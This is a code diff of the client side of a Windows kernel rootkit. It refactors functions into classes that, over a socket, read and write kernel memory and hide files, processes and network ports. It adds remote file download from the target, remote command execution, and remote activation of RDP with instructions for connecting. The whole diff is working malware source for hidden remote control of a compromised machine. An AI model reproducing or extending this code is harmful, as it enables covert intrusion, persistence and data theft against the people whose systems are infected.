@@ -1,8 +1,7 @@
 #include "requests.h"
 
 
-// Get module base address by name - 
-PVOID GetModuleBaseRootkKMD(const char* ModuleName, SOCKET tosock) {
+PVOID DriverCalls::GetModuleBaseRootkKMD(const char* ModuleName, SOCKET tosock) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA OprStatus = { 0 };
 	printf("=====GetModuleBaseAddress=====\n\n");
@@ -40,8 +39,7 @@ PVOID GetModuleBaseRootkKMD(const char* ModuleName, SOCKET tosock) {
 }
 
 
-// Read from kernel memory - 
-bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err) {
+bool DriverCalls::ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	printf("\n=====ReadFromRootkKMD=====\n");
 	RootkInstructions.Operation = RKOP_READ;
@@ -111,8 +109,7 @@ bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, co
 }
 
 
-// Write into kernel memory - 
-bool WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const char* ModuleName, const char* SemiMdl, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
+bool DriverCalls::WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const char* ModuleName, const char* SemiMdl, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA result;
 	char ConfirmMalloc = 1;
@@ -205,10 +202,7 @@ bool WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const
 }
 
 
-// Get system information data:
-
-// Check for valid info type string - 
-static BOOL ValidateInfoTypeString(const char* InfoType) {
+static BOOL DriverCalls::ValidateInfoTypeString(const char* InfoType) {
 	if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
 		return FALSE;
 	}
@@ -226,7 +220,7 @@ static BOOL ValidateInfoTypeString(const char* InfoType) {
 
 
 // Actual function to handle request -
-BOOL GetSystemInfoRootkKMD(const char* InfoTypes, SOCKET tosock, ROOTKIT_MEMORY* RootkInstructions, const char* ModuleName, char* ProcessorsNum) {
+BOOL DriverCalls::GetSystemInfoRootkKMD(const char* InfoTypes, SOCKET tosock, ROOTKIT_MEMORY* RootkInstructions, const char* ModuleName, char* ProcessorsNum) {
 	ULONG64 SysInfSize = 0;
 	ULONG64 SysBuffOfs = 0;
 	char FailedUnex = 1;
@@ -361,7 +355,7 @@ BOOL GetSystemInfoRootkKMD(const char* InfoTypes, SOCKET tosock, ROOTKIT_MEMORY*
 
 
 // Specifically allocate memory in certain process - 
-PVOID SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
+PVOID DriverCalls::SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	printf("\n=====SpecAllocRootkKMD=====\n");
 	RootkInstructions.Operation = RKOP_PRCMALLOC;
@@ -410,7 +404,7 @@ PVOID SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* Modul
 }
 
 
-BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
+BOOL DriverCalls::HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA OprStatus = { 0 };
 	DWORD PathLength = 0;  // Length of path in GENERAL MEMORY (strlen * 2, not including 
@@ -525,7 +519,7 @@ BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCK
 }
 
 
-BOOL HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
+BOOL DriverCalls::HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA OprStatus = { 0 };
 	PVOID HiddenProcesses = NULL;
@@ -630,8 +624,301 @@ BOOL HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int ProcessId, int Rem
 			}
 		}
 	}
-	printf("RESPONSE: Manipulations of files/folders succeeded :)\n");
+	printf("RESPONSE: Manipulations of processes succeeded :)\n");
 	printf("\n===========================\n");
 	free(HiddenProcesses);
+	return TRUE;
+}
+
+
+BOOL DriverCalls::HidePortConnectionRootkKMD(char ModuleName[], USHORT PortNumber, USHORT RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
+	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	PASS_DATA OprStatus = { 0 };
+	PVOID HiddenPorts = NULL;
+	USHORT CurrentHiddenPort = 0;
+	int CurrentIndex = 0;
+	printf("=====HidePort=====\n\n");
+	RootkInstructions.Operation = RKOP_HIDEPROC;
+
+
+	// Pass initial string:
+	if (!PassString(tosock, ModuleName)) {
+		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass status of type of port manipulation:
+	OprStatus = SendData(tosock, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
+	if (OprStatus.err || OprStatus.value != sizeof(NTSTATUS)) {
+		printf("LOG: Could not perform manipulations of ports (passing/receiving errors) :(\n");
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass preprocessing parameters (if needed) and set struct values:
+	switch (RequestStatus) {
+	case HIDE_PROCESS:
+		RootkInstructions.Buffer = (PVOID)PortNumber;
+		RootkInstructions.Reserved = 0;
+		RootkInstructions.Size = HidePort;
+		break;
+	case UNHIDE_PROCESS:
+		if (RemoveIndex != -1) {
+			RootkInstructions.Buffer = (PVOID)REMOVE_BY_INDEX_PORT;
+			RootkInstructions.Reserved = (PVOID)RemoveIndex;
+		}
+		else {
+			RootkInstructions.Buffer = (PVOID)PortNumber;
+			RootkInstructions.Reserved = 0;
+		}
+		RootkInstructions.Size = UnhidePort;
+		break;
+	default:
+		RootkInstructions.Size = ListHiddenPorts;
+		break;
+	}
+
+
+	// Pass all of the arguments of the operation to the medium:
+	BOOL Res = PassArgs(&RootkInstructions, tosock, TRUE);
+	if (!Res) {
+		printf("LOG: Could not perform manipulations of ports (passing/receiving errors) :(\n");
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Parse results of operation:
+	PrintStatusCode(RootkInstructions.StatusCode);
+	PrintUnexpected(RootkInstructions.Unexpected);
+	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
+		printf("RESPONSE: Could not perform manipulations of ports - did not succeed :(\n");
+		printf("=====================\n\n");
+		return FALSE;
+	}
+
+
+	// Parse output for specific requests:
+	if (RequestStatus == SHOWHIDDEN_PORTS) {
+		if (RootkInstructions.Size == 0) {
+			printf("RESPONSE: Could not perform manipulations of ports - listing request returned list with size of 0 bytes :(\n");
+			printf("=====================\n\n");
+			return FALSE;
+		}
+		HiddenPorts = malloc(RootkInstructions.Size);
+		if (HiddenPorts == NULL) {
+			printf("RESPONSE: Could not perform manipulations of ports - could not allocate memory for list :(\n");
+			printf("\n===========================\n");
+			return FALSE;
+		}
+		OprStatus = RecvData(tosock, RootkInstructions.Size, HiddenPorts, FALSE, 0);
+		if (OprStatus.err || OprStatus.value != RootkInstructions.Size) {
+			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
+			printf("\n===========================\n");
+			free(HiddenPorts);
+			return FALSE;
+		}
+		printf("Currently hidden ports (dynamically):\n");
+		RtlCopyMemory(&CurrentHiddenPort, (PVOID)((ULONG64)HiddenPorts + (CurrentIndex * sizeof(USHORT))), sizeof(USHORT));
+		while (CurrentHiddenPort != 65535) {
+			printf("Port at index %d - %hu\n", CurrentIndex, CurrentHiddenPort);
+			CurrentIndex++;
+			RtlCopyMemory(&CurrentHiddenPort, (PVOID)((ULONG64)HiddenPorts + (CurrentIndex * sizeof(USHORT))), sizeof(USHORT));
+		}
+	}
+	printf("RESPONSE: Manipulations of ports succeeded :)\n");
+	printf("\n===========================\n");
+	free(HiddenPorts);
+	return TRUE;
+}
+
+
+BOOL GeneralRequests::DownloadFileRequest(char* FilePath, SOCKET ClientToServerSocket) {
+	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	PASS_DATA OprStatus = { 0 };
+	PVOID FileData = NULL;
+	char LocalPath[MAX_PATH] = { 0 };
+	printf("=====DownloadFile=====\n\n");
+	RootkInstructions.Operation = RKOP_GETFILE;
+
+
+	// Pass initial string:
+	if (!PassString(ClientToServerSocket, FilePath)) {
+		printf("LOG: Could not pass file path (%s) to medium :(\n", FilePath);
+		printf("======================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass all of the arguments of the operation to the medium:
+	BOOL Res = PassArgs(&RootkInstructions, ClientToServerSocket, TRUE);
+	if (!Res) {
+		printf("LOG: Could not get file (passing/receiving errors) :(\n");
+		printf("======================\n\n");
+		return FALSE;
+	}
+
+
+	// Get the buffer with the file data if operation succeeded:
+	PrintStatusCode(RootkInstructions.StatusCode);
+	PrintUnexpected(RootkInstructions.Unexpected);
+	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Size == 0) {
+		printf("RESPONSE: Could not get file - did not succeed :(\n");
+		printf("======================\n\n");
+		return FALSE;
+	}
+	FileData = malloc(RootkInstructions.Size);
+	if (FileData == NULL){
+		printf("Could not get buffer with file data :(\n");
+		printf("======================\n\n");
+		return FALSE;
+	}
+	OprStatus = RecvData(ClientToServerSocket, RootkInstructions.Size, FileData, FALSE, 0);
+	if (OprStatus.err || OprStatus.value != RootkInstructions.Size) {
+		printf("Could not get buffer with file data :(\n");
+		printf("======================\n\n");
+		return FALSE;
+	}
+
+
+	// Store file data in local file:
+	printf("Write path to store file in (match the extensions):\n");
+	scanf_s("%s", LocalPath);
+	HANDLE LocalHandle = CreateFileA(LocalPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
+		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (LocalHandle == INVALID_HANDLE_VALUE) {
+		printf("Could not handle for local file :(\n");
+		printf("======================\n\n");
+		return FALSE;
+	}
+	DWORD BytesWritten = 0;
+	if (!WriteFile(LocalHandle, FileData, RootkInstructions.Size, &BytesWritten, NULL) ||
+		BytesWritten != RootkInstructions.Size) {
+		CloseHandle(LocalHandle);
+		printf("Could not write to local file :(\n");
+		printf("======================\n\n");
+		return FALSE;
+	}
+	printf("Created local file at %s\n", LocalPath);
+	printf("======================\n\n");
+	CloseHandle(LocalHandle);
+	return TRUE;
+}
+
+BOOL GeneralRequests::RemoteCommandRequest(char* NakedCommand, SOCKET ClientToServerSocket) {
+	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	PASS_DATA OprStatus = { 0 };
+	PVOID CommandResult = NULL;
+	char LocalPath[MAX_PATH] = { 0 };
+	printf("=====RemoteCommand=====\n\n");
+	RootkInstructions.Operation = RKOP_EXECOMMAND;
+	printf("=======================\n\n");
+
+
+	// Pass initial string:
+	if (!PassString(ClientToServerSocket, NakedCommand)) {
+		printf("LOG: Could not pass naked command (%s) to medium :(\n", NakedCommand);
+		printf("=======================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass all of the arguments of the operation to the medium:
+	BOOL Res = PassArgs(&RootkInstructions, ClientToServerSocket, TRUE);
+	if (!Res) {
+		printf("LOG: Could not perform CMD command (passing/receiving errors) :(\n");
+		printf("=======================\n\n");
+		return FALSE;
+	}
+
+
+	// Get the buffer with the command result if operation succeeded:
+	PrintStatusCode(RootkInstructions.StatusCode);
+	PrintUnexpected(RootkInstructions.Unexpected);
+	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Size == 0) {
+		printf("RESPONSE: Could not execute command - did not succeed :(\n");
+		printf("=======================\n\n");
+		return FALSE;
+	}
+	CommandResult = malloc(RootkInstructions.Size);
+	if (CommandResult == NULL) {
+		printf("Could not get buffer with command result :(\n");
+		printf("=======================\n\n");
+		return FALSE;
+	}
+	OprStatus = RecvData(ClientToServerSocket, RootkInstructions.Size, CommandResult, FALSE, 0);
+	if (OprStatus.err || OprStatus.value != RootkInstructions.Size) {
+		printf("Could not get buffer with command result :(\n");
+		printf("=======================\n\n");
+		return FALSE;
+	}
+
+
+	// Store command result in local file:
+	printf("Write path to store command result in:\n");
+	scanf_s("%s", LocalPath);
+	HANDLE LocalHandle = CreateFileA(LocalPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
+		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (LocalHandle == INVALID_HANDLE_VALUE) {
+		printf("Could not handle for local file of command result :(\n");
+		printf("=======================\n\n");
+		return FALSE;
+	}
+	DWORD BytesWritten = 0;
+	if (!WriteFile(LocalHandle, CommandResult, RootkInstructions.Size, &BytesWritten, NULL) ||
+		BytesWritten != RootkInstructions.Size) {
+		CloseHandle(LocalHandle);
+		printf("Could not write to local file of command result :(\n");
+		printf("=======================\n\n");
+		return FALSE;
+	}
+	printf("Created local file with command result at %s\n", LocalPath);
+	printf("=======================\n\n");
+	CloseHandle(LocalHandle);
+	return TRUE;
+}
+
+
+BOOL GeneralRequests::ActivateRDPRequest(SOCKET ClientToServerSocket, char* DummyString) {
+	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	printf("=====ActivateRDPRequest=====\n\n");
+	RootkInstructions.Operation = RKOP_ACTIVATERDP;
+	printf("============================\n\n");
+
+
+	// Pass initial string:
+	if (!PassString(ClientToServerSocket, DummyString)) {
+		printf("LOG: Could not pass dummy string (%s) to medium :(\n", DummyString);
+		printf("============================\n\n");
+		return FALSE;
+	}
+
+
+	// Pass all of the arguments of the operation to the medium:
+	BOOL Res = PassArgs(&RootkInstructions, ClientToServerSocket, TRUE);
+	if (!Res) {
+		printf("LOG: Could not activate RDP (passing/receiving errors) :(\n");
+		printf("============================\n\n");
+		return FALSE;
+	}
+
+
+	// Check if activating RDP has succeeded:
+	PrintStatusCode(RootkInstructions.StatusCode);
+	PrintUnexpected(RootkInstructions.Unexpected);
+	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Size == 0) {
+		printf("RESPONSE: Could not activate RDP - did not succeed :(\n");
+		printf("============================\n\n");
+		return FALSE;
+	}
+	printf("Activated RDP, to connect to server:\n"
+		   "1) If mRemoteNG is not installed download it from https://mremoteng.org/download\n"
+		   "2) Select RDP as the remote protocol and write the target IP address from the download server\n"
+		   "3) Press the green arrow next to the protocol specifier to open the connection\n"
+		   "4) Press the X button on the connection window to stop the connection\n");
+	printf("============================\n\n");
 	return TRUE;
 }
